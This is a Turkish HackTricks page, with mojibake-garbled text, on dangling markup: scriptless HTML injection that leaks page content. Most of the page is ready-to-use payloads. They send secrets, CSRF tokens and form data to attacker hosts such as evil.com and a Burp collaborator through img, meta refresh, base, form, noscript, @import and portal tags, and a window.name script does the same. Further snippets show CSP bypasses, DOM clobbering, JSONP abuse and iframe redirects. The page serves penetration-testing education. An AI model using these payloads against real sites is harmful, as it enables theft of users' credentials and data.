# Dangling Markup - HTML scriptless injection

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Ã–zgeÃ§miÅŸ

Bu teknik, bir **HTML enjeksiyonu bulunduÄŸunda** bir kullanÄ±cÄ±dan bilgi Ã§Ä±karmak iÃ§in kullanÄ±labilir. EÄŸer **bir** [**XSS** ](../xss-cross-site-scripting/) **istismar etmenin bir yolunu bulamazsanÄ±z** ama **bazÄ± HTML etiketleri enjekte edebilirseniz** bu Ã§ok faydalÄ±dÄ±r.\
AyrÄ±ca, HTML'de **ÅŸifreli bir metin aÃ§Ä±k metin olarak** kaydedilmiÅŸse ve bunu **istemciden dÄ±ÅŸarÄ± Ã§Ä±karmak** istiyorsanÄ±z veya bazÄ± script yÃ¼rÃ¼tmelerini yanÄ±ltmak istiyorsanÄ±z da faydalÄ±dÄ±r.

Burada yorumlanan birkaÃ§ teknik, bilgiyi beklenmedik yollarla (html etiketleri, CSS, http-meta etiketleri, formlar, base...) dÄ±ÅŸarÄ± Ã§Ä±kartarak bazÄ± [**Ä°Ã§erik GÃ¼venlik PolitikasÄ±**](../content-security-policy-csp-bypass/) engellerini aÅŸmak iÃ§in kullanÄ±labilir.

## Ana Uygulamalar

### AÃ§Ä±k metin sÄ±rlarÄ±nÄ± Ã§almak

Sayfa yÃ¼klendiÄŸinde `<img src='http://evil.com/log.cgi?` enjekte ederseniz, kurban size enjekte edilen `img` etiketi ile kod iÃ§indeki bir sonraki alÄ±ntÄ± arasÄ±ndaki tÃ¼m kodu gÃ¶nderecektir. EÄŸer bir sÄ±r bu parÃ§anÄ±n iÃ§inde bir ÅŸekilde bulunuyorsa, onu Ã§alacaksÄ±nÄ±z (aynÄ± ÅŸeyi Ã§ift tÄ±rnak kullanarak da yapabilirsiniz, hangisinin daha ilginÃ§ olabileceÄŸine bakÄ±n).

EÄŸer `img` etiketi yasaksa (Ã¶rneÄŸin CSP nedeniyle) `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?` kullanabilirsiniz.
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Not edin ki **Chrome, iÃ§inde "<" veya "\n" bulunan HTTP URL'lerini** engeller, bu yÃ¼zden "ftp" gibi diÄŸer protokol ÅŸemalarÄ±nÄ± deneyebilirsiniz.

AyrÄ±ca CSS `@import`'Ä± kÃ¶tÃ¼ye kullanabilirsiniz (";" bulana kadar tÃ¼m kodu gÃ¶nderecektir).
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
**`<table`** kullanabilirsiniz:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
Bir `<base` etiketi de ekleyebilirsiniz. TÃ¼m bilgiler alÄ±ntÄ± kapatÄ±lana kadar gÃ¶nderilecektir, ancak bu bazÄ± kullanÄ±cÄ± etkileÅŸimleri gerektirir (kullanÄ±cÄ±nÄ±n bir baÄŸlantÄ±ya tÄ±klamasÄ± gerekir, Ã§Ã¼nkÃ¼ base etiketi baÄŸlantÄ±nÄ±n iÅŸaret ettiÄŸi alan adÄ±nÄ± deÄŸiÅŸtirmiÅŸ olacaktÄ±r):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### FormlarÄ± Ã‡almak
```html
<base href='http://evil.com/'>
```
Sonra, verileri yola gÃ¶nderen formlar (Ã¶rneÄŸin `<form action='update_profile.php'>`) verileri kÃ¶tÃ¼ niyetli alan adÄ±na gÃ¶nderecektir.

### FormlarÄ± Ã‡alma 2

Bir form baÅŸlÄ±ÄŸÄ± ayarlayÄ±n: `<form action='http://evil.com/log_steal'>` bu, bir sonraki form baÅŸlÄ±ÄŸÄ±nÄ± geÃ§ersiz kÄ±lacak ve formdan gelen tÃ¼m veriler saldÄ±rgana gÃ¶nderilecektir.

### FormlarÄ± Ã‡alma 3

Buton, formun bilgilerini gÃ¶ndereceÄŸi URL'yi "formaction" niteliÄŸi ile deÄŸiÅŸtirebilir:
```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
Bir saldÄ±rgan bunu bilgileri Ã§almak iÃ§in kullanabilir.

Bu [**saldÄ±rÄ±nÄ±n bir Ã¶rneÄŸini bu yazÄ±da bulabilirsiniz**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### DÃ¼z metin sÄ±rlarÄ±nÄ± Ã§almak 2

Yeni bahsedilen tekniÄŸi kullanarak formlarÄ± Ã§almak iÃ§in (yeni bir form baÅŸlÄ±ÄŸÄ± enjekte ederek) ardÄ±ndan yeni bir giriÅŸ alanÄ± enjekte edebilirsiniz:
```html
<input type='hidden' name='review_body' value="
```
ve bu giriÅŸ alanÄ±, HTML'deki Ã§ift tÄ±rnaklarÄ± arasÄ±ndaki tÃ¼m iÃ§eriÄŸi ve bir sonraki Ã§ift tÄ±rnaÄŸÄ± iÃ§erecektir. Bu saldÄ±rÄ±, "_**AÃ§Ä±k metin sÄ±rlarÄ±nÄ± Ã§alma**_" ile "_**FormlarÄ± Ã§alma2**_" karÄ±ÅŸtÄ±rÄ±r.

AynÄ± ÅŸeyi bir form ve bir `<option>` etiketi enjekte ederek de yapabilirsiniz. KapalÄ± bir `</option>` bulunana kadar tÃ¼m veriler gÃ¶nderilecektir:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Form parametre enjeksiyonu

Bir formun yolunu deÄŸiÅŸtirebilir ve beklenmedik bir eylemin gerÃ§ekleÅŸtirilmesi iÃ§in yeni deÄŸerler ekleyebilirsiniz:
```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        â† Injected lines

<form action="/change_settings.php">                        â† Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             â† Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### Noscript aracÄ±lÄ±ÄŸÄ±yla aÃ§Ä±k metin sÄ±rlarÄ±nÄ± Ã§almak

`<noscript></noscript>` TarayÄ±cÄ±nÄ±n javascript'i desteklemediÄŸi durumlarda iÃ§eriÄŸi yorumlanacak bir etikettir (Javascript'i Chrome'da [chrome://settings/content/javascript](chrome://settings/content/javascript) adresinden etkinleÅŸtirebilir/devre dÄ±ÅŸÄ± bÄ±rakabilirsiniz).

SaldÄ±rganÄ±n kontrolÃ¼ndeki bir siteye, enjeksiyon noktasÄ±ndan sayfanÄ±n altÄ±na kadar iÃ§eriÄŸi dÄ±ÅŸarÄ± aktarmanÄ±n bir yolu, bunu enjekte etmektir:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### KullanÄ±cÄ± EtkileÅŸimi ile CSP'yi AÅŸma

Bu [portswiggers araÅŸtÄ±rmasÄ±ndan](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) Ã¶ÄŸrenebilirsiniz ki, **en kÄ±sÄ±tlÄ± CSP** ortamlarÄ±ndan bile bazÄ± **kullanÄ±cÄ± etkileÅŸimleri** ile **veri sÄ±zdÄ±rmak** mÃ¼mkÃ¼ndÃ¼r. Bu durumda kullanacaÄŸÄ±mÄ±z payload:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Not edin ki **kurban**dan **bir baÄŸlantÄ±ya tÄ±klamasÄ±nÄ±** isteyeceksiniz, bu baÄŸlantÄ± onu sizin kontrolÃ¼nÃ¼zdeki **payload**'a **yÃ¶nlendirecek**. AyrÄ±ca, **`base`** etiketinin iÃ§indeki **`target`** niteliÄŸinin bir sonraki tek tÄ±rnak iÅŸaretine kadar **HTML iÃ§eriÄŸi** iÃ§ereceÄŸini unutmayÄ±n.\
Bu, baÄŸlantÄ±ya tÄ±klanÄ±rsa **`window.name`** deÄŸerinin tÃ¼m **HTML iÃ§eriÄŸi** olacaÄŸÄ± anlamÄ±na gelir. Bu nedenle, kurbanÄ±n baÄŸlantÄ±ya tÄ±klayarak eriÅŸtiÄŸi sayfayÄ± **kontrol ettiÄŸiniz** iÃ§in, o **`window.name`**'e eriÅŸebilir ve bu veriyi **exfiltrate** edebilirsiniz:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### YanÄ±ltÄ±cÄ± script iÅŸ akÄ±ÅŸÄ± 1 - HTML ad alanÄ± saldÄ±rÄ±sÄ±

HTML iÃ§inde bir id ile yeni bir etiket ekleyin, bu etiket bir sonraki etiketi geÃ§ersiz kÄ±lacak ve bir scriptin akÄ±ÅŸÄ±nÄ± etkileyecek bir deÄŸerle. Bu Ã¶rnekte, bir bilginin kiminle paylaÅŸÄ±lacaÄŸÄ±nÄ± seÃ§iyorsunuz:
```html
<input type='hidden' id='share_with' value='fredmbogo'>     â† Injected markup
...
Share this status update with:                              â† Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### YanÄ±ltÄ±cÄ± script iÅŸ akÄ±ÅŸÄ± 2 - Script ad alanÄ± saldÄ±rÄ±sÄ±

HTML etiketleri ekleyerek javascript ad alanÄ±nda deÄŸiÅŸkenler oluÅŸturun. ArdÄ±ndan, bu deÄŸiÅŸken uygulamanÄ±n akÄ±ÅŸÄ±nÄ± etkileyecektir:
```html
<img id='is_public'>                                        â† Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    â† The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           â† Condition always evaluates to true
...
}
```
### JSONP'nin Suistimali

EÄŸer bir JSONP arayÃ¼zÃ¼ bulursanÄ±z, rastgele bir fonksiyonu rastgele verilerle Ã§aÄŸÄ±rma imkanÄ±nÄ±z olabilir:
```html
<script src='/editor/sharing.js'>:              â† Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    â† Injected JSONP call
set_sharing({ ... })
```
Ya da bazÄ± javascript'leri Ã§alÄ±ÅŸtÄ±rmayÄ± deneyebilirsiniz:
```html
<script src='/search?q=a&call=alert(1)'></script>
```
### Iframe istismarÄ±

Bir Ã§ocuk belge, ebeveyninin `location` Ã¶zelliÄŸini gÃ¶rÃ¼ntÃ¼leme ve deÄŸiÅŸtirme yeteneÄŸine sahiptir, hatta Ã§apraz kÃ¶ken durumlarÄ±nda bile. Bu, bir **iframe** iÃ§inde bir script yerleÅŸtirilmesine ve istemcinin rastgele bir sayfaya yÃ¶nlendirilmesine olanak tanÄ±r:
```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Bu, ÅŸu ÅŸekilde hafifletilebilir: `sandbox=' allow-scripts allow-top-navigation'`

Bir iframe, **iframe ad Ã¶zniteliÄŸini** kullanarak farklÄ± bir sayfadan hassas bilgileri sÄ±zdÄ±rmak iÃ§in de kÃ¶tÃ¼ye kullanÄ±labilir. Bunun nedeni, kendisini iframe'leyen bir iframe oluÅŸturabilmenizdir; bu, **hassas bilgilerin iframe ad Ã¶zniteliÄŸi iÃ§inde gÃ¶rÃ¼nmesini** saÄŸlayan HTML enjeksiyonunu kÃ¶tÃ¼ye kullanÄ±r ve ardÄ±ndan o adÄ± ilk iframe'den eriÅŸip sÄ±zdÄ±rabilirsiniz.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
Daha fazla bilgi iÃ§in [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes) adresini kontrol edin.

### \<meta abuse

**`meta http-equiv`** kullanarak **birÃ§ok iÅŸlem** gerÃ§ekleÅŸtirebilirsiniz, Ã¶rneÄŸin bir Cookie ayarlamak: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` veya bir yÃ¶nlendirme yapmak (bu durumda 5 saniye iÃ§inde): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Bu, **http-equiv** ile ilgili bir **CSP** ile **Ã¶nlenebilir** ( `Content-Security-Policy: default-src 'self';`, veya `Content-Security-Policy: http-equiv 'self';`)

### Yeni \<portal HTML tag

\<portal etiketinin istismar edilebilir zayÄ±flÄ±klarÄ± hakkÄ±nda Ã§ok **ilginÃ§ bir araÅŸtÄ±rma** bulabilirsiniz [burada](https://research.securitum.com/security-analysis-of-portal-element/).\
Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± anda, portal etiketini Chrome'da `chrome://flags/#enable-portals` adresinden etkinleÅŸtirmeniz gerekiyor, aksi takdirde Ã§alÄ±ÅŸmayacaktÄ±r.
```html
<portal src='https://attacker-server?
```
### HTML Leak'leri

HTML'de baÄŸlantÄ± sÄ±zdÄ±rmanÄ±n tÃ¼m yollarÄ± Dangling Markup iÃ§in faydalÄ± olmayacak, ancak bazen yardÄ±mcÄ± olabilir. Buradan kontrol edin: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leak'leri

Bu, **dangling markup ve XS-Leaks** arasÄ±nda bir **karÄ±ÅŸÄ±m**dÄ±r. Bir taraftan, zafiyet **aynÄ± kÃ¶k** sayfasÄ±na **HTML** (ancak JS deÄŸil) enjekte etmeye izin verir. DiÄŸer taraftan, HTML enjekte edebileceÄŸimiz sayfayÄ± doÄŸrudan **saldÄ±rÄ±ya** uÄŸratmayacaÄŸÄ±z, ama **baÅŸka bir sayfayÄ±** hedef alacaÄŸÄ±z.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Arama/XS-Leak'leri

XS-Arama, **yan kanal saldÄ±rÄ±larÄ±nÄ±** istismar ederek **Ã§apraz kÃ¶ken bilgilerini** **sÄ±zdÄ±rmaya** yÃ¶neliktir. Bu nedenle, Dangling Markup'tan farklÄ± bir tekniktir, ancak bazÄ± teknikler HTML etiketlerinin (JS yÃ¼rÃ¼tmesi ile ve olmadan) dahil edilmesini istismar eder, Ã¶rneÄŸin [**CSS Enjeksiyonu**](../xs-search/#css-injection) veya [**Tembel YÃ¼kleme GÃ¶rselleri**](../xs-search/#image-lazy-loading)**.**

{% content-ref url="../xs-search/" %}
[xs-search](../xs-search/)
{% endcontent-ref %}

## Brute-Force Tespit Listesi

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## Referanslar

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
